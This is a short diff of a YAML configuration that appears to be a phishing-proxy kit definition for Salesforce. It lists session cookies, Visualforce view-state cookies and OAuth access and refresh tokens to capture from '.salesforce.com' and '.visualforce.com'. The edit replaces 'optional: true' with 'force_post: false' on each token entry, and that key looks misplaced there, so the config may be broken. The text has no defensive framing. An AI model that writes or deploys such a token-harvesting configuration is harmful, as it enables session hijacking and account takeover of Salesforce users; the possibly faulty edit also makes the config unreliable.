@@ -38,24 +38,25 @@ auth_tokens:
   - domain: '.salesforce.com'
     keys: ['sid', 'oid', 'sid_Client', 'sid_ClientOauth', 'BrowserId', 'BrowserId_sec']
     type: 'cookie'
+    force_post: false
   
   # Session and security cookies
   - domain: '.salesforce.com'
     keys: ['com.salesforce.visualforce.ViewState', 'com.salesforce.visualforce.ViewStateVersion', 'com.salesforce.visualforce.ViewStateMAC']
     type: 'cookie'
-    optional: true
+    force_post: false
   
   # OAuth tokens
   - domain: '.salesforce.com'
     keys: ['oauth_token', 'oauth_token_secret', 'access_token', 'refresh_token']
     type: 'cookie'
-    optional: true
+    force_post: false
   
   # Instance-specific cookies
   - domain: '.visualforce.com'
     keys: ['sid', 'oid', 'BrowserId']
     type: 'cookie'
-    optional: true
+    force_post: false
 
 credentials:
   username:
